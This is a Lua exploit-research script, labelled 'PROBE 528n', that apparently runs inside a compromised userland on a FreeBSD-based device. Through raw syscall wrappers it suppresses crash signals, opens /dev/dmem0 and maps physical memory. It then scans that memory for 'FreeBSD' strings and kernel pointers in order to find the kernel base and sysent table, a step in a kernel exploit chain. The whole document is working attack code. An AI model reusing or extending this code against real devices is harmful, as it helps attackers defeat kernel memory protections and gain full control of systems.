-- CRASH_CLASS: LOW
-- PROBE 528n: Wide physical memory scan for kernel signatures
--
-- 528m: 0-512 MiB scanned, no ELF headers. All addresses mappable.
-- The kernel may not start with ELF magic in physical memory.
-- And it may be above 512 MiB.
--
-- Strategy:
-- 1. Scan 512 MiB to 5.25 GB (full dmem range)
-- 2. Also look for kernel-specific patterns:
--    - sysent entry pattern: each entry is ~32 bytes with function pointers
--      in the 0xFFFFFFFF_9Exxxxxx range (if KASLR is off)
--    - String "FreeBSD" in kernel .rodata
--    - The value 0xE6E5C0 (sysent file offset from 13.60) might appear near
--      the base as a relocation
-- 3. Try physical addresses above dmem range (if the device allows)

print("=== PROBE 528n: WIDE PHYSICAL MEMORY SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa_buf, uint64(0)) end)
end

-- Open dmem0
local devpath = memory.alloc(0x20)
local dname = "/dev/dmem0"
for i = 1, #dname do wd(N(devpath) + i - 1, string.byte(dname, i)) end
wd(N(devpath) + #dname, 0)
local ok_o, dmem_fd = pcall(function()
    return native.fcall_with_rax(stub, 5, uint64(N(devpath)), uint64(2), uint64(0))
end)
local fd = ok_o and N(dmem_fd) or -1
print("dmem0 fd=" .. fd)
if fd < 0 then return end

local sc_477 = mk(477)
local sc_73 = mk(73)

local PAGE = 0x4000
local CHUNK = 0x1000000  -- 16 MiB

-- ============================================================
-- [A] Test: how far can we map?
-- ============================================================
print("")
print("[A] Testing mappable physical range")
local test_addrs = {}
-- Powers of 2 from 512MB to 16GB
for shift = 29, 34 do
    local addr = 2 ^ shift
    table.insert(test_addrs, addr)
end
-- Also test some specific addresses
table.insert(test_addrs, 0x150000000)  -- dmem size boundary
table.insert(test_addrs, 0x200000000)  -- 8 GB
table.insert(test_addrs, 0x300000000)  -- 12 GB
table.insert(test_addrs, 0x380000000)  -- 14 GB

for _, addr in ipairs(test_addrs) do
    if not alive() then break end
    local phys = uint64(string.format("0x%X", addr))
    local ok_t, rv_t = pcall(function()
        return sc_477(uint64(0), uint64(PAGE), uint64(1), uint64(1), uint64(fd), phys)
    end)
    local status = "CRASH"
    if ok_t and rv_t then
        local rh, rl = get_hi_lo(rv_t)
        if rh < 0 then rh = rh + 0x100000000 end
        if rh == 0xFFFFFFFF then
            status = "FAIL"
        else
            local d = rd(N(rv_t))
            if d == nil then
                status = "mapped-FAULT"
            else
                if d < 0 then d = d + 0x100000000 end
                status = string.format("OK [0]=0x%08X", d)
            end
            pcall(function() sc_73(rv_t, uint64(PAGE)) end)
        end
    end
    print(string.format("  0x%X (%d GB): %s", addr, math.floor(addr / 0x40000000), status))
end

-- ============================================================
-- [B] Scan for "FreeBSD" string in physical memory
-- ============================================================
print("")
print("[B] Scanning for kernel strings (0-2GB, sampling)")

-- We can't scan every byte of 2 GB in time. Instead, sample every 1 MiB
-- and look for the "Free" substring (0x65657246 in LE).
local FREE_LE = 0x65657246  -- "Free" as LE dword
local freebsd_hits = {}

-- Scan every 1 MiB in 0-2GB range, checking first 64KB of each MiB
local sample_step = 0x100000  -- 1 MiB
local sample_size = 0x10000   -- check first 64KB of each MiB

for base_off = 0, 0x80000000 - 1, sample_step do
    if not alive() then break end
    if #freebsd_hits >= 10 then break end  -- enough hits

    local phys = uint64(string.format("0x%X", base_off))
    local ok_s, rv_s = pcall(function()
        return sc_477(uint64(0), uint64(sample_size), uint64(1), uint64(1), uint64(fd), phys)
    end)

    if ok_s and rv_s then
        local sh, sl = get_hi_lo(rv_s)
        if sh < 0 then sh = sh + 0x100000000 end
        if sh ~= 0xFFFFFFFF then
            -- Scan for "Free" pattern every 4 bytes
            for off = 0, sample_size - 4, 4 do
                local d = rd(N(rv_s) + off)
                if d == FREE_LE or d == (FREE_LE - 0x100000000) then
                    -- Check if next bytes are "BSD "
                    local d2 = rd(N(rv_s) + off + 4)
                    if d2 then
                        if d2 < 0 then d2 = d2 + 0x100000000 end
                        local b0 = d2 % 256         -- 'B'
                        local b1 = math.floor(d2/256) % 256   -- 'S'
                        local b2 = math.floor(d2/65536) % 256 -- 'D'
                        if b0 == 0x42 and b1 == 0x53 and b2 == 0x44 then
                            local phys_hit = base_off + off
                            table.insert(freebsd_hits, phys_hit)
                            -- Read surrounding context
                            local ctx = ""
                            for i = 0, 31 do
                                local b = rd(N(rv_s) + off + i)
                                if b then
                                    local c = b % 256
                                    if c >= 32 and c < 127 then ctx = ctx .. string.char(c) else ctx = ctx .. "." end
                                end
                            end
                            print(string.format("  phys 0x%X: \"FreeBSD\" ctx=\"%s\"",
                                phys_hit, ctx:sub(1, 40)))
                        end
                    end
                end
            end
            pcall(function() sc_73(rv_s, uint64(sample_size)) end)
        end
    end
end

-- ============================================================
-- [C] Look for kernel pointers (0xFFFFFFFF_9Exxxxxx pattern)
-- ============================================================
print("")
print("[C] Scanning for kernel pointer patterns")

-- Kernel VA pattern from 13.60: 0xFFFFFFFF9Exxxxxx
-- On 14.10 without KASLR (confirmed), the base might be similar.
-- Look for qwords where hi32 = 0xFFFFFFFF and lo32 & 0xFF000000 >= 0x9E000000
-- These would be kernel .text/.data pointers.

local kptr_hits = {}

-- Scan 0-512 MiB more carefully (every page, but only first 64 bytes per page)
for base_off = 0, 0x20000000 - 1, CHUNK do
    if not alive() then break end
    if #kptr_hits >= 20 then break end

    local phys = uint64(string.format("0x%X", base_off))
    local ok_c, rv_c = pcall(function()
        return sc_477(uint64(0), uint64(CHUNK), uint64(1), uint64(1), uint64(fd), phys)
    end)

    if ok_c and rv_c then
        local ch, cl = get_hi_lo(rv_c)
        if ch < 0 then ch = ch + 0x100000000 end
        if ch ~= 0xFFFFFFFF then
            -- Check first 64 bytes of each page for kernel-like pointers
            for p = 0, CHUNK / PAGE - 1 do
                for off = 0, 56, 8 do
                    local v = rq(N(rv_c) + p * PAGE + off)
                    if v then
                        local vh, vl = get_hi_lo(v)
                        if vh < 0 then vh = vh + 0x100000000 end
                        if vl < 0 then vl = vl + 0x100000000 end
                        -- Kernel pointer check: hi32 = 0xFFFFFFFF, avoid NaN-boxed values
                        if vh == 0xFFFFFFFF then
                            local exp = math.floor(vh / 0x100000) % 0x800
                            -- NaN check: exponent bits 62:52. For 0xFFFFFFFF, bits 62:52 = 0x7FF → NaN
                            -- So 0xFFFFFFFF_xxxxxxxx is ALWAYS NaN-boxed. Not a kernel pointer.
                            -- Kernel pointers have hi32 like 0xFFFF8xxx NOT 0xFFFFFFFF
                        elseif vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                            -- This could be a kernel pointer!
                            local phys_loc = base_off + p * PAGE + off
                            table.insert(kptr_hits, {phys_loc, vh, vl})
                            if #kptr_hits <= 20 then
                                print(string.format("  phys 0x%X: 0x%08X%08X", phys_loc, vh, vl))
                            end
                        end
                    end
                end
            end
            pcall(function() sc_73(rv_c, uint64(CHUNK)) end)
        end
    end
end

-- ============================================================
-- Summary
-- ============================================================
print("")
print("[SUMMARY]")
print("  FreeBSD strings: " .. #freebsd_hits)
print("  kernel pointers: " .. #kptr_hits)
if #kptr_hits > 0 then
    -- Try to infer kernel base from pointers
    local min_ptr = 0xFFFFFFFF
    for _, hit in ipairs(kptr_hits) do
        if hit[3] < min_ptr then min_ptr = hit[3] end
    end
    print(string.format("  lowest kernel ptr lo32: 0x%08X", min_ptr))
end

print("")
print("alive=" .. tostring(alive()))
print("=== 528n COMPLETE ===")
